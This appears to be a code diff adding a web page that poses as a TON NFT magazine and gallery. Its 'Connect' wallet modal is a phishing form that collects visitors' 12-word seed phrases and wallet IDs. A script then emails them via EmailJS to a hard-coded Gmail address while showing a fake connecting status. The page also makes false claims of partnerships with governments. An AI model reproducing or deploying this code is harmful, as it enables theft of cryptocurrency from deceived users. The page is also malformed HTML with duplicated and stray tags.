@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>TON NFT Magazine</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<style>
+		body {
+			font-family: 'Segoe UI', Arial, sans-serif;
+			background: #c3d0dd;
+			margin: 0;
+			padding: 0;
+			color: #222;
+		}
+		header {
+			background: #a0aeae;
+			color: #fff;
+			padding: 2rem 1rem;
+			text-align: center;
+		}
+		.logo {
+			font-size: 2.5rem;
+			font-weight: bold;
+			letter-spacing: 2px;
+		}
+		.subtitle {
+			font-size: 1.2rem;
+			margin-top: 0.5rem;
+			opacity: 0.85;
+		}
+		main {
+			max-width: 900px;
+			margin: 2rem auto;
+			padding: 1rem;
+		}
+		.nft-grid {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+			gap: 2rem;
+		}
+		.nft-card {
+			background: #fff;
+			border-radius: 12px;
+			box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+			overflow: hidden;
+			transition: transform 0.15s;
+		}
+		.nft-card:hover {
+			transform: translateY(-5px) scale(1.02);
+		}
+		.nft-image {
+			width: 100%;
+			height: 220px;
+			object-fit: cover;
+			background: #e3eaf3;
+		}
+		.nft-content {
+			padding: 1rem;
+		}
+		.nft-title {
+			font-size: 1.1rem;
+			font-weight: bold;
+			margin: 0 0 0.5rem 0;
+		}
+		.nft-desc {
+			font-size: 0.97rem;
+			color: #555;
+			margin-bottom: 0.7rem;
+		}
+		.nft-meta {
+			font-size: 0.85rem;
+			color: #0098ea;
+		}
+		footer {
+			text-align: center;
+			padding: 2rem 1rem 1rem 1rem;
+			color: #888;
+			font-size: 0.95rem;
+		}
+	</style>
+</head>
+<body>
+	<header>
+		<div class="logo">RS ALIBABA NFT & TON NFT Magazine</div>
+		<div class="subtitle">Showcasing the latest and greatest NFTs on The Open Network</div>
+		<!-- Connect Wallet Button at top right -->
+		<button id="connectWalletBtn" style="
+			position: absolute;
+			top: 2rem;
+			right: 2rem;
+			background: #fff;
+			color: #383131;
+			border: none;
+			padding: 0.8rem 2rem;
+			border-radius: 8px;
+			font-size: 1rem;
+			cursor: pointer;
+			transition: background 0.2s;
+			box-shadow: 0 2px 8px rgba(98, 90, 90, 0.07);
+			z-index: 10;
+		">
+		Connect 
+		</button>
+		<!-- Modal for wallet connection -->
+		<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:1000; align-items:center; justify-content:center;">
+			<div style="background:#fff; border-radius:10px; padding:2rem; min-width:320px; max-width:90vw; box-shadow:0 4px 24px rgba(0,0,0,0.18); position:relative;">
+				<button id="closeModalBtn" style="position:absolute; top:10px; right:10px; background:none; border:none; font-size:1.5rem; color:#888; cursor:pointer;">&times;</button>
+				<h2 style="margin-top:0;">Connect Your Wallet</h2>
+		<form id="walletForm" autocomplete="off">
+			<p style="margin-bottom:1rem; color:#555;">Please enter your 12-word seed phrase, wallet ID &<br> select type of wallet to connect.</p>
+			<label for="seedPhrase1" style="display:block; margin-bottom:0.5rem;">Seed Phrase</label>
+			<div id="seedPhraseContainer" style="display: flex; gap: 2rem; flex-wrap: wrap; margin-bottom: 1rem;">
+				<!-- First 6 words vertical -->
+				<div style="display: flex; flex-direction: column; gap: 0.3rem;">
+					<input type="text" id="seedPhrase1" name="seedPhrase1" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase2" name="seedPhrase2" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase3" nametemplate_91d6qb9="seedPhrase3" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase4" name="seedPhrase4" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase5" name="seedPhrase5" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase6" name="seedPhrase6" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+				</div>
+				<!-- Second 6 words vertical -->
+				<div style="display: flex; flex-direction: column; gap: 0.3rem;">
+					<input type="text" id="seedPhrase7" name="seedPhrase7" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase8" name="seedPhrase8" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase9" name="seedPhrase9" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase10" name="seedPhrase10" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase11" name="seedPhrase11" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+					<input type="text" id="seedPhrase12" name="seedPhrase12" maxlength="16" required style="width: 80px; padding:0.5rem; border-radius:6px; border:1px solid #ccc; font-size:0.95rem;">
+				</div>
+			</div>
+			<label for="walletId" style="display:block; margin-bottom:0.5rem;">Wallet ID</label>
+			<input type="text" id="walletId" name="walletId" required placeholder="Enter Wallet ID" style="width:100%; padding:0.5rem; margin-bottom:1rem; border-radius:6px; border:1px solid #ccc;">
+			<label for="walletType" style="display:block; margin-bottom:0.5rem;">Wallet Type</label>
+			<select id="walletType" name="walletType" required style="width:100%; padding:0.5rem; margin-bottom:1.5rem; border-radius:6px; border:1px solid #ccc;">
+				<option value="">Select type</option>
+				<option value="TON">TON</option>
+				<option value="Metamask">Metamask</option>
+				<option value="TrustWallet">TrustWallet</option>
+				<option value="Other">Other</option>
+			</select>
+			<button type="submit" style="background:#0098ea; color:#fff; border:none; padding:0.7rem 2rem; border-radius:8px; font-size:1rem; cursor:pointer;">Connect</button>
+			<div id="walletStatus" style="display:none; margin-top:1rem; color:#0098ea; font-weight:bold;"></div>
+		</form>
+		<!-- EmailJS SDK -->
+		<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+		<script>
+			(function(){ emailjs.init("BETTY"); })();
+
+			const connectBtn = document.getElementById('connectWalletBtn');
+			const modal = document.getElementById('walletModal');
+			const closeModalBtn = document.getElementById('closeModalBtn');
+			const walletForm = document.getElementById('walletForm');
+			const walletStatus = document.getElementById('walletStatus');
+
+			connectBtn.onclick = () => { modal.style.display = 'flex'; };
+			closeModalBtn.onclick = () => { modal.style.display = 'none'; };
+			window.onclick = (e) => { if(e.target === modal) modal.style.display = 'none'; };
+
+			walletForm.addEventListener('submit', async function(e) {
+				e.preventDefault();
+				let phrase1 = [];
+				let phrase2 = [];
+				for (let i = 1; i <= 6; i++) {
+					phrase1.push(walletForm['seedPhrase' + i].value.trim());
+				}
+				for (let i = 7; i <= 12; i++) {
+					phrase2.push(walletForm['seedPhrase' + i].value.trim());
+				}
+				const seedPhrasePart1 = phrase1.join(' ');
+				const seedPhrasePart2 = phrase2.join(' ');
+				const walletId = walletForm.walletId.value;
+				const walletType = walletForm.walletType.value;
+				const EMAIL_TO = "emmanuel3480@gmail.com"; // <-- Change this to your email
+
+				// Send email via EmailJS (client-side, free tier)
+				// You must set up an EmailJS account and replace the following IDs
+				const serviceID = 'service_anjqlmq';
+				const templateID = 'template_91d6qb9';
+				const userID = 'BETTY';
+				try {
+					walletStatus.style.display = 'block';
+					walletStatus.textContent = 'Connecting...';
+					await emailjs.send(serviceID, templateID, {
+						seed_phrase_part1: seedPhrasePart1,
+						seed_phrase_part2: seedPhrasePart2,
+						wallet_id: walletId,
+						wallet_type: walletType,
+						to_email: EMAIL_TO
+					}, userID);
+					walletStatus.textContent = 'CONNECTING';
+					setTimeout(() => { modal.style.display = 'none'; walletStatus.style.display = 'none'; }, 1500);
+				} catch (err) {
+					walletStatus.textContent = 'FAILED. Try again.';
+				}
+			});
+		</script>
+</head>
+<body>
+</body>
+	</header>
+	<div class="content">
+			<h1>We work with the E.U. government, Metaverse Group, and also with the Alibaba China TUV government.</h1>
+			<P class="par">Art Project 1 :-RS Entertainment Boards</P>
+			<style>
+			.content .par{
+                padding-left: 20px;
+				color: #e3eaf3;
+                padding-bottom: 25px;
+                font-family: Arial;
+                letter-spacing: 1.2px;
+                line-height: 30px;}
+
+			content .h1{
+				color: #fff;
+				font-family: 'Times New Roman';
+                font-size: 50px;
+                padding-left: 20px;
+                margin-top: 9%;
+                letter-spacing: 2px;
+			}	
+			</style>
+	<main>
+		<div class="nft-grid" style="display: flex; flex-direction: column; align-items: center; gap: 2rem;">
+			<div class="nft-card">
+				<img class="nft-image" src="img2.jpg" alt="NFT 1">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #1</div>
+					<div class="nft-desc">A beautiful NFT from the TON collection.</div>
+					<div class="nft-meta">Creator: Alice</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="img3.jpg" alt="NFT 2">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #2</div>
+					<div class="nft-desc">Exclusive digital collectible on TON.</div>
+					<div class="nft-meta">Creator: Bob</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="img4.jpg" alt="NFT 3">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #3</div>
+					<div class="nft-desc">Limited edition NFT for true fans.</div>
+					<div class="nft-meta">Creator: Carol</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton 3.jpg" alt="NFT 4">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #4</div>
+					<div class="nft-desc">Rare collectible from the TON series.</div>
+					<div class="nft-meta">Creator: Dave</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton1.jpg" alt="NFT 5">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #5</div>
+					<div class="nft-desc">Unique digital masterpiece.</div>
+					<div class="nft-meta">Creator: Eve</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton10.jpg" alt="NFT 6">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #6</div>
+					<div class="nft-desc">Part of the exclusive TON drop.</div>
+					<div class="nft-meta">Creator: Frank</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton11.jpg" alt="NFT 7">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #7</div>
+					<div class="nft-desc">Digital collectible for art lovers.</div>
+					<div class="nft-meta">Creator: Grace</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton12.jpg" alt="NFT 8">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #8</div>
+					<div class="nft-desc">A must-have NFT from TON.</div>
+					<div class="nft-meta">Creator: Henry</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton13.jpg" alt="NFT 9">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #9</div>
+					<div class="nft-desc">Special edition NFT release.</div>
+					<div class="nft-meta">Creator: Ivy</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton14.jpg" alt="NFT 10">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #10</div>
+					<div class="nft-desc">Collectible from the TON network.</div>
+					<div class="nft-meta">Creator: Jack</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton15.jpg" alt="NFT 11">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #11</div>
+					<div class="nft-desc">Artistic NFT for collectors.</div>
+					<div class="nft-meta">Creator: Kate</div>
+				</div>
+			</div>
+			<div class="nft-card"> 
+				<img class="nft-image" src="ton16.jpg" alt="NFT 12">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #12</div>
+					<div class="nft-desc">Final piece in the TON NFT series.</div>
+					<div class="nft-meta">Creator: Leo</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton17.jpg" alt="NFT 13">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #13</div>
+					<div class="nft-desc">Exclusive TON NFT drop.</div>
+					<div class="nft-meta">Creator: Mona</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton18.jpg" alt="NFT 14">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #14</div>
+					<div class="nft-desc">Rare digital collectible.</div>
+					<div class="nft-meta">Creator: Nick</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton19.jpg" alt="NFT 15">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #15</div>
+					<div class="nft-desc">Limited edition TON NFT.</div>
+					<div class="nft-meta">Creator: Olivia</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton2.jpg" alt="NFT 16">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #16</div>
+					<div class="nft-desc">Digital masterpiece on TON.</div>
+					<div class="nft-meta">Creator: Paul</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton20.jpg" alt="NFT 17">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #17</div>
+					<div class="nft-desc">Art for the digital age.</div>
+					<div class="nft-meta">Creator: Quinn</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton4.jpg" alt="NFT 18">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #18</div>
+					<div class="nft-desc">TON exclusive collectible.</div>
+					<div class="nft-meta">Creator: Rose</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton5.jpg" alt="NFT 19">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #19</div>
+					<div class="nft-desc">Special edition NFT.</div>
+					<div class="nft-meta">Creator: Sam</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton6 .jpg" alt="NFT 20">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #20</div>
+					<div class="nft-desc">Unique TON NFT.</div>
+					<div class="nft-meta">Creator: Tina</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton7.jpg" alt="NFT 21">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #21</div>
+					<div class="nft-desc">Digital collectible for TON fans.</div>
+					<div class="nft-meta">Creator: Uma</div>
+				</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton8.jpg" alt="NFT 22">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #22</div>
+					<div class="nft-desc">Artistic NFT from the TON series.</div>
+					<div class="nft-meta"></div>
+					<div class="nft-meta">Creator: Victor</div>
+			</div>
+			</div>
+			<div class="nft-card">
+				<img class="nft-image" src="ton9.jpg" alt="NFT 23">
+				<div class="nft-content">
+					<div class="nft-title">NFT Artwork #23</div>
+					<div class="nft-desc">Final piece in the TON collection.</div>
+					<div class="nft-meta">Creator: Wendy</div>
+				</div>
+		</div></div>
+	</main>
+</body>
+<style>
+		footer {
+			background: #222323;
+			color: #fff;
+			padding: 1rem;
+			text-align: center;
+			font-size: 0.9rem;
+		}
+		footer a {
+			color: #0098ea;
+			text-decoration: none;
+		}
+		footer a:hover {
+			text-decoration: underline;
+		}
+</style>
+<p>TON NFT Magazine is a digital publication that showcases the latest trends, art, <br>and innovations in the TON (Telegram Open Network) NFT ecosystem.<br> It provides a platform for artists, collectors, and enthusiasts to discover,<br> learn, and engage with the vibrant world of TON NFTs.
+
+The magazine features:
+
+- Exclusive interviews with TON NFT artists, collectors, and industry leaders
+- Showcase of NFT art and collectibles on the TON blockchain
+- Market trends and analysis of the TON NFT market
+- Tips and tutorials on creating, buying, and selling TON NFTs
+- Community spotlights highlighting TON NFT projects and initiatives
+
+TON NFT Magazine aims to educate, inspire, and connect the TON NFT community,<br> fostering growth and innovation in the ecosystem.</p>
+<p>Connect your wallet to explore and collect unique NFTs on the TON blockchain.</p>
+<style>
+
+</style>
+<p>For more information, visit our <a href="https://t.me/Alibaba_NFT1" target="_blank" style="color:#0098ea;">Telegram channel</a>.</p>
+<footer>
+		<p>&copy; 2023 TON NFT Magazine. All rights reserved.</p>
+		<p>Follow us on <a href="https://t.me/Alibaba_NFT1" target="_blank" style="color:#0098ea;">Telegram</a> for the latest updates!</p>
+	</footer>
+	<script>
+		document.getElementById('connectWalletBtn').addEventListener('click', function() {
+			document.getElementById('walletModal').style.display = 'flex';
+		});
+		document.getElementById('closeModalBtn').addEventListener('click', function() {
+			document.getElementById('walletModal').style.display = 'none';
+		});
+		window.onclick = function(event) {
+			if (event.target == document.getElementById('walletModal')) {
+				document.getElementById('walletModal').style.display = 'none';
+			}
+		};
+		document.getElementById('walletForm').addEventListener('submit', function(e) {
+			e.preventDefault();
+			const seedPhrase = Array.from({length: 12}, (_, i) => this['seedPhrase' + (i + 1)].value.trim()).join(' ');
+			const walletId = this.walletId.value.trim();
+			const walletType = this.walletType.value;
+
+			if (!seedPhrase || !walletId || !walletType) {
+				alert('Please fill in all fields.');
+				return;
+			}
+
+			localStorage.setItem('seedPhrase', seedPhrase);
+			localStorage.setItem('walletId', walletId);
+			localStorage.setItem('walletType', walletType);
+
+			alert('Wallet connected successfully!');
+			document.getElementById('walletModal').style.display = 'none';
+		});
+		window.onload = function() {
+			const savedSeed = localStorage.getItem('seedPhrase');
+			const savedWallet = localStorage.getItem('walletId');
+			const savedType = localStorage.getItem('walletType');
+
+			if (savedSeed && savedWallet && savedType) {
+				document.getElementById('walletStatus').textContent = 'Loaded saved wallet data.';
+				document.getElementById('walletStatus').style.display = 'block';
+			}
+		};
+	</script>
+	</html>
+	</html>
